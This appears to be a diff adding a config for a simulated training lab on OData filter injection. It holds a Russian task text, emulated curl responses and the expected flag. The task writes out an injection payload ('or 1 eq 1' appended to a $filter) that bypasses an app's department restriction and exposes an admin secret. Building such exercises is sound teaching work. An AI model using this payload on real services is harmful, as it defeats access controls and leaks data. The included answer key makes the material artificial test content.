@@ -1,0 +1,37 @@
+{
+  "id": "web-odata-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{0d4t4_f1lt3r_0r_byp4ss}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: OData-инъекция\n\nGET /odata/Users?$filter= возвращает пользователей, приложение добавляет условие Dept eq 7.\nОбойди ограничение и найди скрытую запись.\n\n1. Обычный фильтр:\n   curl -s 'https://app.target/odata/Users?$filter=Dept eq 7'\n2. Инъекция OR true:\n   curl -s 'https://app.target/odata/Users?$filter=Dept eq 7 or 1 eq 1'\n3. В выдаче будет скрытая запись (флаг) — запиши её в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/odata)",
+      "cases": [
+        {
+          "match": "1 eq 1|or 1",
+          "example": "-s '.../odata/Users?$filter=Dept eq 7 or 1 eq 1'",
+          "output": "[{\"Id\":7,\"Name\":\"alice\",\"Dept\":7},{\"Id\":1,\"Name\":\"admin\",\"Secret\":\"nto{0d4t4_f1lt3r_0r_byp4ss}\"}]\n"
+        },
+        {
+          "match": "odata",
+          "example": "-s '.../odata/Users?$filter=Dept eq 7'",
+          "output": "[{\"Id\":7,\"Name\":\"alice\",\"Dept\":7}]\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только указанный эндпоинт.\n"
+    }
+  }
+}
